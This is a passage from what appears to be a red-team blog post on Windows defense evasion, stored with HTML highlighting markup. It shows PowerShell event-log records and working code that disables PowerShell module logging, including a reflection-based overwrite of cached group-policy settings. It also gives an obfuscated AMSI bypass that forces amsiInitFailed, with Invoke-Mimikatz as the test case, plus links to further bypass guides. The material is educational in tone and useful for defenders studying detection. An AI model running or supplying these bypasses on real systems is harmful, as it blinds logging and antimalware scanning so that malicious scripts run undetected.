class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">17</span> Command Name = PSConsoleHostReadLine Command <span class=\"built_in\">Type</span> = <span class=\"function\"><span class=\"keyword\">Function</span> <span class=\"title\">Script</span> <span class=\"title\">Name</span> = <span class=\"title\">Command</span> <span class=\"title\">Path</span> = <span class=\"title\">Sequence</span> <span class=\"title\">Number</span> = <span class=\"title\">46</span> <span class=\"title\">User</span> = <span class=\"title\">DESKTOP-47K3P38</span>\\<span class=\"title\">3atef</span> <span class=\"title\">Connected</span> <span class=\"title\">User</span> = <span class=\"title\">Shell</span> <span class=\"title\">ID</span> = <span class=\"title\">Microsoft</span>.<span class=\"title\">PowerShell</span>&lt;/<span class=\"title\">Data</span>&gt; </span></span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(PSConsoleHostReadLine): <span class=\"string\">&quot;PSConsoleHostReadLine&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Write-Host : This directly logs the command you executed, showing the invocation and the parameter ‚Äú@N1NJ10 was here‚Äù.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8234848Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">286</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0002-d13b-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">18</span> Command Name = <span class=\"built_in\">Write-Host</span> Command <span class=\"built_in\">Type</span> = Cmdlet Script Name = Command Path = Sequence Number = <span class=\"number\">48</span> User = DESKTOP<span class=\"literal\">-47K3P38</span>\\<span class=\"number\">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class=\"built_in\">Write-Host</span>): <span class=\"string\">&quot;Write-Host&quot;</span> ParameterBinding(<span class=\"built_in\">Write-Host</span>): name=<span class=\"string\">&quot;Object&quot;</span>; value=<span class=\"string\">&quot;@N1NJ10 was here&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Out-Default : This is likely logged when the prompt is displayed after your command, as PowerShell uses Out-Default to handle the prompt output, even if Write-Host doesn‚Äôt produce pipeline output.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8238426Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">287</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0002-d03b-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">18</span> Command Name = Command <span class=\"built_in\">Type</span> = Script Script Name = Command Path = Sequence Number = <span class=\"number\">50</span> User = DESKTOP<span class=\"literal\">-47K3P38</span>\\<span class=\"number\">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class=\"built_in\">Out-Default</span>): <span class=\"string\">&quot;Out-Default&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Set-StrictMode : This is called by the PSReadLine module, possibly as part of its configuration or internal operations, <strong>and is captured because module logging is enabled for the session. ( So this mean if u call any cmdlet this Event log will be triggered )</strong></li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8268015Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">288</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0000-af3a-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">20</span> Command Name = <span class=\"built_in\">Set-StrictMode</span> Command <span class=\"built_in\">Type</span> = Cmdlet Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\<span class=\"number\">2.0</span>.<span class=\"number\">0</span>\\PSReadLine.psm1 Command Path = Sequence Number = <span class=\"number\">52</span> User = DESKTOP<span class=\"literal\">-47K3P38</span>\\<span class=\"number\">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class=\"built_in\">Set-StrictMode</span>): <span class=\"string\">&quot;Set-StrictMode&quot;</span> ParameterBinding(<span class=\"built_in\">Set-StrictMode</span>): name=<span class=\"string\">&quot;Off&quot;</span>; value=<span class=\"string\">&quot;True&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<p>So the write-host cmdlet make 3 event logs ( Write-Host , Out-Default , Set-StrictMode ) so if we success to disable the Module logging we will see 1 event , Let‚Äôs do it</p>\n<p>In this blog by <a href=\"https://bc-security.org/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/\">HUBBL3</a> , We can see that it‚Äôs not possible to completely block module logging for all modules (even if we use <code>*</code> to include all modules in logging). However, it is possible to bypass logging for specific cmdlets</p>\n<blockquote>\n<ul>\n<li>When the <a href=\"https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events\"><strong>LogPipelineExecutionDetails</strong></a>property value is <code>$true</code>, Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer. The setting is effective only in the current session.</li>\n<li>A PowerShell snap-in is a .NET assembly (typically a DLL) that contains a collection of cmdlets, providers, and sometimes other components that extend PowerShell‚Äôs functionality.</li>\n<li>The ‚Äú4103‚Äù Event-ID is for the Module loggin</li>\n<li>Path for the Events : Event Viewer -&gt; Applications and Services -&gt; Microsoft -&gt; Windows -&gt; PowerShell -&gt; Operational<br>{: .prompt-info }</li>\n</ul>\n</blockquote>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Recon</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Command</span> <span class=\"built_in\">Write-Host</span>).module</span><br><span class=\"line\"><span class=\"built_in\">Get-PSSnapin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Bypass 1 </span></span><br><span class=\"line\"><span class=\"variable\">$module</span> = <span class=\"built_in\">Get-Module</span> Microsoft.PowerShell.Utility</span><br><span class=\"line\"><span class=\"variable\">$module</span>.LogPipelineExecutionDetails = <span class=\"variable\">$false</span></span><br><span class=\"line\"><span class=\"variable\">$Snapin</span> = <span class=\"built_in\">Get-PSSnapin</span> Microsoft.PowerShell.Core</span><br><span class=\"line\"><span class=\"variable\">$Snapin</span>.LogPipelineExecutionDetails = <span class=\"variable\">$false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Bypass 2 </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$GroupPolicy</span> =[<span class=\"type\">ReF</span>].assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.Utils&#x27;</span>).GetFielD(<span class=\"string\">&#x27;cachedGroupPolicySettings&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).GetValue(<span class=\"variable\">$nULL</span>);</span><br><span class=\"line\"><span class=\"variable\">$val</span>=[<span class=\"type\">Collections.Generic.Dictionary</span>[<span class=\"built_in\">String</span>,<span class=\"type\">System.Object</span>]]::new();</span><br><span class=\"line\"><span class=\"variable\">$Val</span>.Add(<span class=\"string\">&#x27;EnableModuleLogging&#x27;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$Val</span>.add(<span class=\"string\">&#x27;ModuleNames&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$GroupPolicy</span>[<span class=\"string\">&#x27;HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging&#x27;</span>]=<span class=\"variable\">$VaL</span></span><br><span class=\"line\"><span class=\"built_in\">Import-Module</span> Microsoft.Powershell.Utility <span class=\"literal\">-Force</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Bypass 3 </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$Cmd</span> = [<span class=\"type\">System.Management.Automation.CmdletInfo</span>]::new(<span class=\"string\">&quot;Write-Host&quot;</span>, [<span class=\"type\">Microsoft.PowerShell.Commands.WriteHostCommand</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Test </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;@N1NJ10 was here&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Test for Bypass 3 </span></span><br><span class=\"line\"></span><br><span class=\"line\">&amp; <span class=\"variable\">$Cmd</span> <span class=\"string\">&quot;@N1NJ10 was here&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see what event that the first bypass will trigger</p>\n<p>With the logic we can count them without any execute , They are 4 lines 2 of them execute a change in the session without any output so there will be</p>\n<ul>\n<li>4 From the PSConsoleHostReadLine</li>\n<li>2 From an unknown Events ( Like the Write-Host ‚Ä¶ )</li>\n</ul>\n<p>Let‚Äôs see</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def37.png\" alt=\"\"></figure>\n\n<p>As we expect there are 6 events trigger ( 2 of them are warrning with Event-ID 4104 )</p>\n<blockquote>\n<ul>\n<li>Don‚Äôt Forget to Clear the logs after some operations to see what the new operations new logs</li>\n<li>If you use script block you will get 2 events<br>{: .prompt-tip }</li>\n</ul>\n</blockquote>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def38.png\" alt=\"\"></figure>\n\n<p>So , Let‚Äôs test to see if this work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def39.png\" alt=\"\"></figure>\n\n<p>Great , It worked the Write-Host now tigger 1 Event log ( PSConsoleHostReadLine )</p>\n<h2 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h2><p>I don‚Äôt talk about automated tools because you can find many writeups talking about them but in the future, I will update this post with some tools that I use in my engagement and some scenarios</p>\n<p>I will provide you with some of these resources enjoy :</p>\n<ul>\n<li><a href=\"https://amsi.fail/\">Amsi.fail</a></li>\n<li><a href=\"https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\">Exploring PowerShell AMSI and Logging Evasion</a></li>\n<li><a href=\"https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/\">Bypass AMSI by manual modification</a></li>\n<li><a href=\"https://answers.microsoft.com/en-us/windowserver/forum/all/powershell-get-information-about-antivirus/9207ebfa-ff97-48f0-b133-dde4cfd4abca\">PowerShell get information about AntiVirus</a></li>\n<li><a href=\"https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation/blob/main/Exercise%202/Sample_1.ps1\">Beginners-Guide-to-Obfuscation</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=wvKwk1wcXvM&list=PLqyUgadpThTJVR6I3FQSBE3mLElxQkcbh&t=1457s\">Evading Detection: A Beginner‚Äôs Guide to Obfuscation - 2022</a></li>\n<li><a href=\"https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/\">A Detailed Guide on AMSI Bypass</a></li>\n<li><a href=\"https://www.thehacker.recipes/evasion/av/obfuscation\">the hacker recipes obfuscation</a></li>\n<li><a href=\"https://github.com/RythmStick/AMSITrigger\">AMSITrigger</a></li>\n<li><a href=\"https://github.com/gatariee/gocheck\">gocheck</a></li>\n<li><a href=\"https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/\">AMSI BYPASS AND EVASION</a></li>\n<li><a href=\"https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b\">AMSI Bypass Memory Patch Technique in 2024</a></li>\n<li><a href=\"https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/\">amsi-bypass-methods</a></li>\n<li><a href=\"https://lolbas-project.github.io/\">lolbas-project</a></li>\n<li><a href=\"https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html\">The Internals of AppLocker</a></li>\n<li><a href=\"https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/\">Windows Applocker Policy ‚Äì A Beginner‚Äôs Guide</a></li>\n<li><a href=\"https://pentestlab.blog/2021/05/17/persistence-amsi/\">persistence-amsi</a></li>\n<li><a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain\">Constrained Language constrain?</a> - <a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/\">What is PowerShell Constrained Language?</a></li>\n<li><a href=\"https://www.ired.team/offensive-security/code-execution/t1118-installutil\">InstallUtil</a></li>\n<li><a href=\"https://github.com/khr0x40sh/WhiteListEvasion\">WhiteListEvasion</a></li>\n<li><a href=\"https://github.com/vinsworldcom/NetCat64/releases\">NetCat64</a></li>\n<li><a href=\"https://sp00ks-git.github.io/posts/CLM-Bypass/\">CLM-Bypass</a></li>\n<li><a href=\"https://github.com/microsoft/AaronLocker\">AaronLocker</a></li>\n<li><a href=\"https://blog.improsec.com/tech-blog/one-thousand-and-one-application-blocks\">one-thousand-and-one-application-blocks</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon\">sysmon</a></li>\n<li><a href=\"https://github.com/mgeeky/Stracciatella\">Stracciatella</a></li>\n<li>Manual Pages</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"Antimalware-Scan-Interface-AMSI\"><a href=\"#Antimalware-Scan-Interface-AMSI\" class=\"headerlink\" title=\"Antimalware Scan Interface [ AMSI ]\"></a>Antimalware Scan Interface [ AMSI ]</h2><p>Antimalware Scan Interface [ AMSI ] is. Microsoft developed it to provide a set of API calls for applications, including any third-party applications, to perform a <span style=\"color:yellow\">signature-based scan of the content</span>.</p>\n<p>Windows Defender uses it to scan PowerShell scripts, .NET, VBA macros, Windows Script Host (WSH), VBScript, and JavaScript to detect common malware. The important thing about AMSI is that you do not need to deploy it; it has been there since Windows 10.</p>\n<p>So how does AMSI work :</p>\n<ul>\n<li>When AMSI is invoked, <span style=\"color:yellow\">AMSI.dll</span> is loaded into the application‚Äôs memory.</li>\n<li>The key functions within AMSI.dll include <code>AmsiScanBuffer</code> and <code>AmsiInitialize</code>.</li>\n<li>If the content is clear it will return 1 means the script will be executed</li>\n</ul>\n<p>Let‚Äôs see :</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def.png\" alt=\"\"></figure>\n\n\n<p>let‚Äôs see what Windows version is Copy<br>that is running and what antivirus software that is installed</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Get-WmiObject</span> Win32_OperatingSystem | <span class=\"built_in\">Select</span> PSComputerName, Caption, Version | <span class=\"built_in\">fl</span></span><br><span class=\"line\"></span><br><span class=\"line\">PSComputerName : ATTACKER</span><br><span class=\"line\">Caption        : Microsoft Windows <span class=\"number\">10</span> Pro</span><br><span class=\"line\">Version        : <span class=\"number\">10.0</span>.<span class=\"number\">19045</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Get-CimInstance</span> <span class=\"literal\">-Namespace</span> root/SecurityCenter2 <span class=\"literal\">-ClassName</span> AntivirusProduct</span><br><span class=\"line\"></span><br><span class=\"line\">displayName              : Bitdefender Antivirus</span><br><span class=\"line\">instanceGuid             : &#123;<span class=\"number\">0</span>F59B032<span class=\"literal\">-EA77-E3A8-2382-74A4346E5522</span>&#125;</span><br><span class=\"line\">pathToSignedProductExe   : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wscfix.exe</span><br><span class=\"line\">pathToSignedReportingExe : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wsccommunicator.exe</span><br><span class=\"line\">productState             : <span class=\"number\">266240</span></span><br><span class=\"line\">PSComputerName           :</span><br><span class=\"line\"></span><br><span class=\"line\">displayName              : Windows Defender</span><br><span class=\"line\">instanceGuid             : &#123;D68DDC3A<span class=\"literal\">-831F-4fae-9E44-DA132C1ACF46</span>&#125;</span><br><span class=\"line\">pathToSignedProductExe   : windowsdefender://</span><br><span class=\"line\">pathToSignedReportingExe : %ProgramFiles%\\Windows Defender\\MsMpeng.exe</span><br><span class=\"line\">productState             : <span class=\"number\">393472</span></span><br><span class=\"line\">PSComputerName           :</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs test AMSI</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Invoke-Mimikatz</span></span><br><span class=\"line\">At line:<span class=\"number\">1</span> char:<span class=\"number\">1</span></span><br><span class=\"line\">+ <span class=\"built_in\">Invoke-Mimikatz</span></span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~</span><br><span class=\"line\">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class=\"line\">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class=\"line\">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"string\">&quot;Invoke&quot;</span>+<span class=\"string\">&quot;Mimikatz&quot;</span></span><br><span class=\"line\">InvokeMimikatz</span><br></pre></td></tr></table></figure>\n\n<p>Okay AMSI works well let‚Äôs try to see several ways to bypass it [ I will explain it in depth so bring ur coffee ]</p>\n<h3 id=\"Error-Forcing\"><a href=\"#Error-Forcing\" class=\"headerlink\" title=\"Error Forcing\"></a>Error Forcing</h3><p>Error forcing to bypass AMSI (Antimalware Scan Interface) is a technique used by attackers to <span style=\"color:yellow\">manipulate errors in a way that causes AMSI to fail, effectively bypassing its scanning functionality</span> , The idea is to exploit weaknesses or specific conditions that prevent AMSI from successfully scanning the content, thereby allowing potentially malicious scripts to execute without being detected.</p>\n<p>Let‚Äôs see an example , and break it into lines</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&#x27;System.Management.Automation.A&#x27;</span>;<span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span>;<span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$w</span>,<span class=\"variable\">$c</span>,<span class=\"variable\">$m</span>))</span><br><span class=\"line\"><span class=\"variable\">$field</span> = <span class=\"variable\">$assembly</span>.GetField((<span class=\"string\">&#x27;am&#123;0&#125;InitFailed&#x27;</span> <span class=\"operator\">-f</span> </span><br><span class=\"line\"><span class=\"variable\">$c</span>),<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$field</span>.SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>$w &#x3D; ‚ÄòSystem.Management.Automation.A‚Äô;$c &#x3D; ‚Äòsi‚Äô;$m &#x3D; ‚ÄòUtils‚Äô</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&#x27;System.Management.Automation.A&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>We have 3 variables here $w , $c , $m if u combine them u will get <code>System.Management.Automation.AmsiUtils</code> but what is it ?</p>\n<p><code>System.Management.Automation.AmsiUtils</code> is a class within the .NET framework that is part of the <code>System.Management.Automation</code> namespace.</p>\n<p>The primary purpose of <code>System.Management.Automation.AmsiUtils</code> is to provide utilities for interacting with AMSI. <span style=\"color:yellow\">It allows PowerShell scripts to be scanned for malicious content by the antivirus software before execution, helping to prevent the execution of malicious scripts</span>.</p>\n<ul>\n<li>$assembly &#x3D; [Ref].Assembly.GetType((‚Äò{0}m{1}{2}‚Äô -f $w,$c,$m))</li>\n</ul>\n<p>Let‚Äôs see it in a good way without variables</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span 